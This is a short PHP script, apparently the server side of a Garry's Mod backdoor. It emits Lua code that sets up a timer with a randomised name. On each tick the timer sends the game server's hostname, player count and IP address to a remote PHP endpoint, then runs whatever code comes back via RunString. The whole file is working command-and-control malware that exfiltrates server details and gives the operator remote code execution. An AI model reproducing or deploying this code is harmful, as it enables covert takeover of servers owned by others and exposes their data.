<?php
// Generate a string of characters
function reloadString($length = 100) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

include('class/include.php');
$url = "http://".$_SERVER["HTTP_HOST"].str_replace("1.php", "2.php", $_SERVER["REQUEST_URI"]);
echo '
timer.Create( "'.reloadString(10).'", '.Params::GetValue('timer_call').', 0, function()
local a = {
n = GetHostName(),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress()
}
http.Post( "'.$url.'", a,
function( body, len, headers, code )
RunString(body)
end)
end)
';
?>